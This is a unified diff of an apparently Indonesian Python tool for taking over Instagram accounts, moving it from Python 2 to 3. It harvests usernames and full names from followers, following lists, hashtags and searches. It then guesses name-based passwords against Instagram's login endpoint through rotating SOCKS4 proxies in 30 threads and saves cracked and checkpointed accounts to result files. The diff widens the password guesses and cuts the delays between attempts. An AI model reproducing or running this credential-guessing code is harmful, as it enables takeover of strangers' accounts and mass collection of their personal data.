@@ -4,11 +4,6 @@ from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import ConnectionError
 from requests import Request, Session
 from time import sleep
-reload(sys)
-sys.setdefaultencoding("utf-8")
-
-# Kalo Mau Recode Izin Dulu!
-# WhatsApp : 6283847921480
 
 loop = 0
 ok = []
@@ -25,27 +20,27 @@ B = ('\x1b[1;96m')
 P = ('\x1b[1;97m')
 
 # Logo
-___logo___ = ("""%s __  __ ____  _____
-|  \/  | __ )|  ___|%s {au:rozhak}
-%s| |\/| |  _ \| |_%s    {ig:@rozhak_official}
-%s| |  | | |_) |  _|%s   {gh:github.com/rozhakxd}
-%s|_|  |_|____/|_|%s     {yt:youtube.com/rozhakid}
-"""%(M,P,M,P,U,P,U,P))
+___logo___ = ("""%s       Created by : rozhak
+%s ___ ___ ___ __  __ ___ _   _ __  __
+%s| _ \ _ \ __|  \/  |_ _| | | |  \/  |
+%s|  _/   / _|| |\/| || || |_| | |\/| |
+%s|_| |_|_\___|_|  |_|___|\___/|_|  |_|"""%(P,B,B,H,H))
 # Proxy
 try:
-    ___res = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy.txt').text
-    open('Data/proxy.txt','w').write(___res)
+    __res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
+    open('Data/proxy.txt','w').write(__res)
 except:
-    exit("%s[%s!%s]%s Proxy Error"%(P,M,P,M))
+    __sep = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy3.txt').text
+    open('Data/proxy.txt','w').write(__sep)
 # Requests Session
 ses = Session()
 # Login Cookie
 def ___login___():
     os.system('clear')
     print(___logo___)
-    print("%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Baru Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
+    print("%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Tumbal Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
     try:
-        ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
+        ___cookie___ = input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
         if ___cookie___ in ['open','Open']:
             print("%s[%s!%s]%s Anda Akan Diarahkan Ke Youtube"%(M,H,M,H))
             os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
@@ -55,11 +50,13 @@ def ___login___():
         __get = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
         open('kuki.txt','w').write(___cookie___)
         print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,__get['full_name']))
-        ___cookies___()
+        ___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
     except (ValueError):
         exit("%s[%s!%s]%s Cookie Instagram Tidak Bisa Digunakan Harap Ganti Dengan Akun Lain"%(P,M,P,M))
+    except (IndexError):
+        exit("%s[%s!%s]%s Cookie Error Tidak Ada {ds_user_id=}"%(P,M,P,M))
     except (ConnectionError):
         exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
 # Headers
@@ -92,6 +89,8 @@ def ___cookies___():
             os.system('rm -rf kuki.txt');___login___()
     except (KeyError):
         os.system('rm -rf kuki.txt');exit("%s[%s!%s]%s Cookie Error"%(P,M,P,M))
+    except (ConnectionError):
+        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
 # Daftar Menu
 def ___menu___():
     os.system('clear')
@@ -104,9 +103,11 @@ def ___menu___():
     try:
         ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
         __inf = requests.get('https://i.instagram.com/api/v1/users/'+open('Data/user.txt','r').read()+'/info/', headers=___head).json()['user']
+        print("%s[%s>%s]%s——————————————————————————————"%(K,P,K,P))
         print("%s[%s•%s]%s Welcome :%s %s"%(H,P,H,P,K,__inf['full_name']))
         print("%s[%s•%s]%s User :%s %s"%(H,P,H,P,K,open('Data/user.txt','r').read()))
-        print("%s[%s•%s]%s Follower :%s %s\n"%(H,P,H,P,K,__inf['follower_count']))
+        print("%s[%s•%s]%s Follower :%s %s"%(H,P,H,P,K,__inf['follower_count']))
+        print("%s[%s>%s]%s——————————————————————————————\n"%(K,P,K,P))
     except (KeyError):
         print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
         os.system('rm -rf kuki.txt');sleep(2)
@@ -124,7 +125,7 @@ def ___menu___():
     print("%s[%s9%s]%s Lihat Hasil Crack"%(B,P,B,P))
     print("%s[%sA%s]%s Cara Menggunakan"%(B,P,B,P))
     print("%s[%s0%s]%s Hapus Cookies\n"%(B,P,B,P))
-    ___menu___ = raw_input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
+    ___menu___ = input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
     if ___menu___ in ['1','01']:
         ___mengikuti___()
     elif ___menu___ in ['2','02']:
@@ -145,7 +146,7 @@ def ___menu___():
         print("\n%s[%s1%s]%s Lihat Hasil Results/Ok.txt"%(B,P,B,P))
         print("%s[%s2%s]%s Lihat Hasil Results/Cp.txt"%(B,P,B,P))
         print("%s[%s0%s]%s Keluar %s{%sExit%s}"%(B,P,B,P,B,H,B))
-        ___hasil___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
+        ___hasil___ = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
         if ___hasil___ in ['1','01']:
             os.system('cat Results/Ok.txt')
             exit("\n")
@@ -170,30 +171,28 @@ def ___mengikuti___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
-        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
-            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
-            ___nama = __res['full_name'].replace(' ','_') + '.txt'
-            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
-            print("%s[%s?%s]%s Total Mengikuti :%s %s"%(B,P,B,P,H,__res['following_count']))
-            print("%s   "%(P))
-        else:
-            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
+        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
+        if ___user___ in ['',' ']:
+            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
+        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
+        ___nama = __res['full_name'].replace(' ','_') + '.txt'
+        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
+        print("%s[%s?%s]%s Mengikuti :%s %s"%(B,P,B,P,H,__res['edge_follow']['count']))
+        print("%s   "%(P))
     except (KeyError):
         exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
     try:
-        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/following/?count='+___limit___, headers=___head)
+        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+__res['id']+'/following/?count=5000', headers=___head)
         ___file = open('Dump/'+___nama, 'w')
         for z in json.loads(__sep.text)["users"]:
-            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
+            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
             print("\r"+z['username']+"<=>"+z['full_name'])
         ___file.close()
         print("\r%s                   "%(P))
         print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
         print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
         print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -203,30 +202,28 @@ def ___pengikut___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
-        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
-            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
-            ___nama = __res['full_name'].replace(' ','_') + '.txt'
-            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
-            print("%s[%s?%s]%s Total Pengikut :%s %s"%(B,P,B,P,H,__res['follower_count']))
-            print("%s   "%(P))
-        else:
-            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
+        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
+        if ___user___ in ['',' ']:
+            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
+        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
+        ___nama = __res['full_name'].replace(' ','_') + '.txt'
+        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
+        print("%s[%s?%s]%s Pengikut :%s %s"%(B,P,B,P,H,__res['edge_followed_by']['count']))
+        print("%s   "%(P))
     except (KeyError):
         exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
     try:
-        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/followers/?count='+___limit___, headers=___head)
+        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+__res['id']+'/followers/?count=5000', headers=___head)
         ___file = open('Dump/'+___nama, 'w')
         for z in json.loads(__sep.text)["users"]:
-            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
+            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
             print("\r"+z['username']+"<=>"+z['full_name'])
         ___file.close()
         print("\r%s                   "%(P))
         print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
         print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
         print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -236,28 +233,27 @@ def ___beranda___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
-        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
-            ___nama = __res['full_name'].replace(' ','_') + '.txt'
-            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
-            print("%s   "%(P))
-        else:
-            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
+        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
+        if ___user___ in ['',' ']:
+            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
+        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
+        ___nama = __res['full_name'].replace(' ','_') + '.txt'
+        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
+        print("%s   "%(P))
     except (KeyError):
         exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
     try:
         __sep = ses.get("https://i.instagram.com/api/v1/feed/reels_tray/", headers=___head).json()
         ___file = open('Dump/'+___nama, 'w')
         for z in __sep['tray']:
-            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
+            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
             print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
         ___file.close()
         print("\r%s                   "%(P))
         print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
         print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
         print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -267,20 +263,20 @@ def ___hastag___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___tag___ = raw_input("\n%s[%s?%s]%s Hastag :%s "%(B,P,B,P,H)).replace('#','')
-        ___nama = raw_input("%s[%s?%s]%s File :%s "%(B,P,B,P,H))
+        ___tag___ = input("\n%s[%s?%s]%s Hastag :%s "%(B,P,B,P,H)).replace('#','')
+        ___nama = input("%s[%s?%s]%s File :%s "%(B,P,B,P,H))
         __sep = ses.get('https://i.instagram.com/api/v1/feed/tag/'+___tag___+'/?rank_token=caf8d67a-5140-4fcd-a795-e2a9047dc5d9', headers=___head).json()
         ___file = open('Dump/'+___nama, 'w')
         print("%s   "%(P))
         for z in __sep['ranked_items']:
-            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
+            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
             print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
         ___file.close()
         print("\r%s                   "%(P))
         print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
         print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
         print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -290,21 +286,24 @@ def ___search___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
-        ___nama = ___user___+'.txt'
+        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
+        if ___user___ in ['',' ']:
+            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
+        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
+        ___nama = __res['full_name'].replace(' ','_') + '.txt'
+        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
         print("%s   "%(P))
-        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            __sep = ses.get('https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id='+___user___+'&include_friendship_status=true',headers=___head).json()
-            ___file = open('Dump/'+___nama, 'w')
-            for z in __sep['users']:
-                ___file.write(z['username']+'<=>'+z['full_name']+'\n')
-                print("\r"+z['username']+"<=>"+z['full_name'])
-            ___file.close()
-            print("\r%s                   "%(P))
-            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
-            print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
-            print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-            raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        __sep = ses.get('https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id='+__res['id']+'&include_friendship_status=true',headers=___head).json()
+        ___file = open('Dump/'+___nama, 'w')
+        for z in __sep['users']:
+            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
+            print("\r"+z['username']+"<=>"+z['full_name'])
+        ___file.close()
+        print("\r%s                   "%(P))
+        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
+        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
+        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -314,20 +313,20 @@ def ___query___():
     global ___header___,ses
     try:
         ___head = ___header___()
-        ___nama = raw_input("\n%s[%s?%s]%s Query :%s "%(B,P,B,P,H)).replace(' ','')
-        ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
+        ___nama = input("\n%s[%s?%s]%s Query :%s "%(B,P,B,P,H)).replace(' ','')
+        ___limit___ = input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
         __sep = ses.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+___nama+'&rank_token=0.3953592318270893&count='+___limit___, headers=___head).json()
         ___file = open('Dump/'+___nama+'.txt', 'w')
         print("%s   "%(P))
         for z in __sep['users']:
-            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
+            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
             print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
         ___file.close()
         print("\r%s                   "%(P))
         print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
         print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama+'.txt','r').readlines())))
         print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama+'.txt'))
-        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+        input("%s[%sKembali%s]"%(K,P,K));___menu___()
     except (KeyError):
         exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
     except (ConnectionError):
@@ -335,18 +334,18 @@ def ___query___():
 # Dump Email
 def ___email___():
     try:
-        ___user___ = raw_input("\n%s[%s?%s]%s Nama :%s "%(B,P,B,P,H)).replace(' ','')
+        ___user___ = input("\n%s[%s?%s]%s Nama :%s "%(B,P,B,P,H)).replace(' ','')
         ___nama = ___user___+'.txt'
-        ___limit___ = int(raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H)))
+        ___limit___ = int(input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H)))
         if ___limit___ >= 1001:
             exit("%s[%s!%s]%s Maksimal 1000"%(P,M,P,M))
-        ___email___ = raw_input("%s[%s?%s]%s Domain :%s "%(B,P,B,P,H))
+        ___email___ = input("%s[%s?%s]%s Domain :%s "%(B,P,B,P,H))
         print("%s   "%(P))
         if ___email___ in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
             ___file = open('Dump/'+___nama, 'w')
             for z in range(___limit___):
                 ___nomor = random.randint(1, 999)
-                email___ = ___user___+str(___nomor)+___email___+'<=>'+___user___+' '+str(___nomor)
+                email___ = ___user___+str(___nomor)+___email___+'<=>'+___user___+' '+str(___nomor)+'  '
                 ___file.write(email___+'\n')
                 print('\r'+email___)
             ___file.close()
@@ -354,7 +353,7 @@ def ___email___():
             print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
             print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
             print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
-            raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
+            input("%s[%sKembali%s]"%(K,P,K));___menu___()
         else:
             exit("%s[%s!%s]%s Domain : @gmail.com,@yahoo.com,@hotmail.com,@email.com,@mail.com,@outlok.com,@yandex.com"%(P,M,P,M))
     except (KeyError):
@@ -365,33 +364,33 @@ def ___password___():
     print("%s[%s2%s]%s Gunakan Password %s{%sName,Name123,Name12345%s}"%(B,P,B,P,H,P,H))
     print("%s[%s3%s]%s Gunakan Password %s{%sName,Name123,Name1234,Name12345,Name123456%s}"%(B,P,B,P,H,P,H))
     print("%s[%s4%s]%s Gunakan Password Manual %s{%s>5%s}"%(B,P,B,P,H,P,H))
-    ___pilih___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
+    ___pilih___ = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
     if ___pilih___ in ['4','04']:
         print("%s[%s!%s]%s Gunakan (,) Untuk Password Yang Berbeda"%(M,P,M,P))
-        pws = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,K)).split(',')
+        pws = input("%s[%s?%s]%s Password :%s "%(H,P,H,P,K)).split(',')
         if pws <=5:
             exit("%s[%s!%s]%s Password Lebih Dari 6 Karakter"%(P,M,P,M))
     try:
-        ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,K))
+        ___file___ = input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,K))
         ___list = open(___file___,'r').read().splitlines()
     except (IOError):
         exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
     print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
-    print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt\n"%(B,P,B,P,H))
-    with ThreadPoolExecutor(max_workers=10) as (hayuk):
+    print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt\n"%(B,P,B,P,K))
+    with ThreadPoolExecutor(max_workers=30) as (hayuk):
         for v in ___list:
             user, name = v.split('<=>')
             z = name.split(' ')
             if ___pilih___ in ['1','01']:
-                pwx = [z[0]+'123', z[0]+'12345']
+                pwx = [z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
             elif ___pilih___ in ['2','02']:
-                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
+                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
             elif ___pilih___ in ['3','03']:
-                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
+                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456', z[1]+'123', z[1]+'1234', z[1]+'12345', z[1]+'123456']
             elif ___pilih___ in ['4','04']:
                 pwx = pws
             else:
-                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
+                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
             hayuk.submit(___crack___, ___list, user, pwx)
     exit("\r%s[%sSelesai%s]%s                        "%(H,P,H,P))
 # Crack Instagram
@@ -403,12 +402,12 @@ def ___crack___(total,user,pwx):
         ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
     sys.stdout.write(
         "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s     "%(loop, len(total), len(ok), len(cp))
-    ); sys.stdout.flush();sleep(2)
+    ); sys.stdout.flush()
     try:
         for pw in pwx:
             pw = pw.lower()
-            proxy = random.choice(open("Data/proxy.txt","r").read().splitlines())
             ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
+            proxy = random.choice(open("Data/proxy.txt","r").read().splitlines())
             header = {
                 'Accept-Encoding': 'gzip, deflate',
                 'Accept-Language': 'en-US,en;q=0.8',
@@ -433,7 +432,7 @@ def ___crack___(total,user,pwx):
                 "username": user,
                 "enc_password": enc_pass
                 }
-            req = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=header, data=data_post, proxies={'http': 'socks4://'+proxy}, allow_redirects=True).json()
+            req = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=header, data=data_post, proxies={'http': f'socks4://{proxy}'}, allow_redirects=True).json()
             if 'userId' in str(req):
                 try:
                     __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
@@ -450,6 +449,7 @@ def ___crack___(total,user,pwx):
                 print("%s[>] Password : %s\n"%(P,pw))
                 ok.append("%s|%s"%(user,pw))
                 open('Results/Ok.txt','a').write("%s|%s\n"%(user,pw))
+                break
             elif 'checkpoint' in str(req):
                 try:
                     __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
@@ -466,21 +466,23 @@ def ___crack___(total,user,pwx):
                 print("%s[>] Password : %s\n"%(P,pw))
                 cp.append("%s|%s"%(user,pw))
                 open('Results/Cp.txt','a').write("%s|%s\n"%(user,pw))
+                break
             elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
-                print("\r%s[%s!%s]%s Hidupkan Mode Pesawat 2 Detik"%(P,M,P,M)),
-                sys.stdout.flush();sleep(5)
+                sys.stdout.write(
+                    "\r%s[%s!%s]%s Gunakan Mode Pesawat 2 Detik"%(P,M,P,M)),
+                sys.stdout.flush();sleep(7)
                 ___crack___(total,user,pwx)
             else:
                 continue
         loop +=1
     except (ConnectionError):
-        print("\r%s[%s!%s]%s Koneksi Error                "%(P,K,P,K)),
-        sys.stdout.flush();sleep(3)
+        sys.stdout.write(
+            "\r%s[%s!%s]%s Koneksi Error                "%(P,K,P,K)),
+        sys.stdout.flush();sleep(5)
         ___crack___(total,user,pwx)
-    except:
-        pass
+#    except:
+#        pass
 
 if __name__=='__main__':
     os.system('git pull')
-    raw_input("\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m Gunakan Script Ini Sewajarnya Saja Author Tidak Bertanggung Jawab Jika Anda Menyalahgunakan Script Ini!\n\n\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;92m Dengan Menekan Enter Berarti Anda Menyetujui Syarat & Ketentuan Yang Ada!\x1b[1;97m ")
     ___menu___()
